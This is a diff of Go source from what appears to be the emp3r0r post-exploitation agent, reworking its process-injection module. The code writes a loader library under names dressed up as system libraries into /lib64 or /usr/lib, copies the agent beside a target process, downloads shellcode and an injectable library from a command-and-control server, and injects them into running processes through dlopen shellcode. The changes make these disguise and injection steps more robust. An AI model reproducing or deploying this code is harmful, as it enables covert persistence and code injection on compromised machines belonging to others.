@@ -91,23 +91,24 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 		return "", fmt.Errorf("only supports x86_64")
 	}
 
-	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
-		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
+	so_path = fmt.Sprintf("/%s/%s",
+		RuntimeConfig.UtilsPath, NameTheLibrary())
 	if os.Geteuid() == 0 {
-		so_path = fmt.Sprintf("/lib64/libpam.so.1.%d.1", util.RandInt(0, 20))
+		so_path = fmt.Sprintf("/lib64/%s", NameTheLibrary())
 	}
-	if !util.IsExist(so_path) {
+	if !util.IsFileExist(so_path) {
 		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
 		if err != nil {
 			return "", fmt.Errorf("Extract loader.so failed: %v", err)
 		}
-		err = os.WriteFile(so_path, out, 0644)
+		err = os.WriteFile(so_path, out, 0o644)
 		if err != nil {
 			return "", fmt.Errorf("Write loader.so failed: %v", err)
 		}
 	}
 
 	// see loader/elf/loader.c
+	// make sure loader.so can find emp3r0r
 	exe_file := util.ProcExePath(pid)
 	if pid <= 0 && bin != "" {
 		exe_file = bin
@@ -118,10 +119,6 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 	agent_path := fmt.Sprintf("%s/_%s",
 		util.ProcCwd(pid),
 		util.FileBaseName(exe_file))
-	if HasRoot() {
-		agent_path = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
-			util.FileBaseName(exe_file))
-	}
 	err = CopySelfTo(agent_path)
 
 	return
@@ -150,7 +147,10 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 }
 
 func prepare_shared_lib() (path string, err error) {
-	path = fmt.Sprintf("/usr/lib/libBLT.2.5.so.%d.so", util.RandInt(0, 100))
+	path = fmt.Sprintf("/usr/lib/%s", NameTheLibrary())
+	if !HasRoot() {
+		path = fmt.Sprintf("%s/%s", RuntimeConfig.UtilsPath, NameTheLibrary())
+	}
 	_, err = DownloadViaCC("to_inject.so", path)
 	if err != nil {
 		err = fmt.Errorf("Failed to download to_inject.so from CC: %v", err)
@@ -161,7 +161,6 @@ func prepare_shared_lib() (path string, err error) {
 // prepare the shellcode
 func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
 	sc, err := DownloadViaCC("shellcode.txt", "")
-
 	if err != nil {
 		log.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
@@ -185,7 +184,6 @@ func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
 
 // InjectorHandler handles `injector` module
 func InjectorHandler(pid int, method string) (err error) {
-
 	// dispatch
 	switch method {
 
@@ -218,7 +216,11 @@ func InjectorHandler(pid int, method string) (err error) {
 func InjectSharedLib(so_path string, pid int) (err error) {
 	dlopen_addr, err := GetSymFromLibc(pid, "__libc_dlopen_mode")
 	if err != nil {
-		return fmt.Errorf("failed to get __libc_dlopen_mode address for %d: %v", pid, err)
+		log.Printf("failed to get __libc_dlopen_mode address for %d: %v, trying `dlopen`", pid, err)
+	}
+	dlopen_addr, err = GetSymFromLibc(pid, "dlopen")
+	if err != nil {
+		return fmt.Errorf("failed to get dlopen address for %d: %v", pid, err)
 	}
 	shellcode := gen_dlopen_shellcode(so_path, dlopen_addr)
 	if len(shellcode) == 0 {
